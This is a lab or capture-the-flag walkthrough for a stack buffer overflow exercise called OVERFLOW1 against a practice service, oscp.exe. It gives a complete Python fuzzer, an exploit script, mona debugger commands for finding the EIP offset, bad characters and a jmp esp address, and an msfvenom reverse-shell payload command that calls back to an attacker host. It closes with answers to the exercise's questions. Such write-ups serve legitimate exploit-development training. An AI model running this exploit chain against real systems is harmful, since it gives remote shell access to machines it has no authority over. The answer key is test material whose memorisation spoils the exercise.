# OVERFLOW1
Run Immunity Debugger as Administrator. Then navigate to `File` -> `Open` -> `oscp.exe`. To run the binary select `Debug -> Run`.

We can connect to the service via netcat:
```
nc 10.10.28.219 1337
```

## Mona Configuration
Set a working forlder **(important to do each time you open Immunity Debugger)**:
```
!mona config -set workingfolder C:\mona\%p
```

## Fuzzing
Create this script on the attacking machine.
```
# cat fuzzer.py
```
```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.28.219"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

## Crash Replication & Controlling EIP
```
# cat exploit.py
```
```python
import socket

ip = "10.10.28.219"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Use `cyclic` to create a cyclic pattern 400 bytes longer than the length of bytes that crashed the server:
```
user@arch:~$ cyclic 600
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
```

The `oscp.exe` should crash so use this Immunity Debugger command to find the cyclic pattern:
```
!mona findmsp -distance 600
```

We will see a line that contains:
```
EIP contains normal pattern : ... (offset XXXX)
```
The `XXXX` value is the offset of bytes needed to reach the EIP register. After this we can add four bytes to the return address. Modify `exploit.py` to use this offset, use an empty payload for now, and set the `retn` variable to `BBBB`.

After running the exploit again, we should see EIP overwritten with 4 B's.

## Finding Bad Characters
Generate bytarray in mona (exluding `\x00`)
```
!mona bytearray -b "\x00"
```

Generate string of bad chars identical to bytearray
```python
for x in range(1, 256):
	print("\\x" + "{:02x}".format(x), end='')
print()
```

Set `payload` in `exploit.py` to the string of bad chars and run the exploit again

Find the address that the ESP register is pointing to and substitute it into the following command:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

A window will pop up showing the comparison of the `bytearray.bin` to the bytes in memory. Not all of these will be bad characters since some bad characters corrupt the next byte or entire string.

Update the `exploit.py` script to remove bad chars and generate a new bytearray in mona specifying the new bad chars. Repeat this process until the result of the comparison is "Unmodified".

## Finding a Jump Point
Run the following command and specify all badchars in the `-cpb` option:
```
!mona jmp -r esp -cpb "\x00"
```

This will find all the `jmp esp` instructions where the address does not contain any badchars (ESP register will point to instructions after the `ret` instruction).

Update the `exploit.py` script and set the `retn` variable to one of these addresses (using little endian).

## Generate Payload
Run the following `msfvenom` command and specify the badchars with `-b`
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

Copy these bytes into the `payload` variable in `exploit.py`

## Prepend NOPs
Since the payload likely used an encoder, we need space in memory for the payload to unpack. We can do this by adding 16 or more "no operation" (`\x90`) bytes into the `padding` variable in `exploit.py`:
```python
paddng = "\x90" * 16
```

## Exploit
Start the netcat listener on our attacking box and run `exploit.py` against the vulnserver. If the prefix, offset, return address, padding, and payload are set correctly we should now have a reverse shell.

## Questions
What is the EIP offset for OVERFLOW1?
```
1978
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW1?
```
\x00\x07\x2e\xa0
```